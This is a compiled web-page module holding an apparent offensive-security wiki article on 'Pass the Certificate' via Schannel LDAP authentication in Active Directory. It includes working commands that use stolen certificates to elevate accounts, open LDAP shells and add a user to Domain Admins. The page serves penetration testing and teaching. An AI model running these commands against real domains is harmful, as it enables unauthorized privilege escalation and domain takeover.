import{_ as o,c as k,a5 as r,G as t,w as a,B as n,o as p,j as i,a as s}from"./chunks/framework.B5CpDqM0.js";const m=JSON.parse('{"title":"Pass the Certificate","description":"","frontmatter":{"authors":"ShutdownRepo, ThePirateWhoSmellsOfSunflowers"},"headers":[],"relativePath":"ad/movement/schannel/passthecert.md","filePath":"ad/movement/schannel/passthecert.md","lastUpdated":1724982529000}'),d={name:"ad/movement/schannel/passthecert.md"};function c(F,e,C,u,g,y){const h=n("PluginTabsTab"),l=n("PluginTabs");return p(),k("div",null,[e[2]||(e[2]=r('<h1 id="pass-the-certificate" tabindex="-1">Pass the Certificate <a class="header-anchor" href="#pass-the-certificate" aria-label="Permalink to &quot;Pass the Certificate&quot;">​</a></h1><div class="note custom-block"><p>This technique extends the notion of <a href="./../kerberos/pass-the-certificate">Pass the Certificate</a>, thus dubbed by myself, <a href="https://twitter.com/_nwodtuhs/" target="_blank" rel="noreferrer">@_nwodtuhs</a>, in a Twitter thread about AD CS and PKINIT <a href="https://twitter.com/_nwodtuhs/status/1451510341041594377" target="_blank" rel="noreferrer">here</a>. Even if both techniques share the same name and the same concept, the authentication method is different.</p></div><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Sometimes, Domain Controllers do not support <a href="./../kerberos/pass-the-certificate">PKINIT</a>. This can be because their certificates do not have the <code>Smart Card Logon</code> EKU. Most of the time, domain controllers return <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> error when the EKU is missing. Fortunately, several protocols — including LDAP — support Schannel, thus authentication through TLS. As the term &quot;schannel authentication&quot; is derived from the <a href="https://learn.microsoft.com/en-us/windows-server/security/tls/tls-ssl-schannel-ssp-overview" target="_blank" rel="noreferrer">Schannel SSP (Security Service Provider)</a> which is the Microsoft SSL/TLS implementation in Windows, it is important to note that schannel authentication is a SSL/TLS client authentication.</p><div class="tip custom-block"><p></p><ul><li>Schannel authentication relies on TLS so it is, by design, not subject to channel binding, as the authentication is borne by TLS itself.</li><li>Schannel is not subject to LDAP signing either as the <code>bind</code> is performed after a StartTLS command when used on the LDAP TCP port.</li></ul></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',6)),t(l,null,{default:a(()=>[t(h,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[i("p",null,[s("Tools like "),i("a",{href:"https://github.com/AlmondOffSec/PassTheCert/",target:"_blank",rel:"noreferrer"},"PassTheCert"),s(" (python version) and "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),s(" can be used to authenticate with the certificate via Schannel against LDAP.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"$"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," cert"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.pfx"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nokey"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -out"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.crt")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"$"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," cert"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.pfx"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nocert"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -out"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.key")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"passthecert.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," modify_user"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -crt"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.crt"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -key"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.key"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," domain.local"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "10.0.0.1"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user_sam"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -elevate")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# spawn a LDAP shell")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"passthecert.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ldap-shell"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -crt"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.crt"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -key"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user.key"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," domain.local"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "10.0.0.1"')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auth"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "10.0.0.1"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ldap-shell")])])])],-1)])),_:1}),t(h,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[i("p",null,[s("Pass the cert technique can be done with "),i("a",{href:"https://github.com/AlmondOffSec/PassTheCert/",target:"_blank",rel:"noreferrer"},"PassTheCert"),s(" (C# version).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Add simple_user to Domain Admins (it assumes that the domain account for which the certificate was issued, holds privileges to add user to this group)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"."),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"\\"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"PassTheCert.exe"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --server"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," fqdn.domain.local"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --cert-path"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," Z:"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\c"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"ert.pfx"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --add-account-to-group"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CN=Domain Admins,CN=Users,DC=domain,DC=local"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CN=simple_user,CN=Users,DC=domain,DC=local"')])])])],-1)])),_:1})]),_:1}),e[3]||(e[3]=r('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" target="_blank" rel="noreferrer">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</a></p><p><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf" target="_blank" rel="noreferrer">Certified Pre-Owned (pdf)</a></p><p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a></p><p><a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d" target="_blank" rel="noreferrer">https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d</a></p>',5))])}const B=o(d,[["render",c]]);export{m as __pageData,B as default};
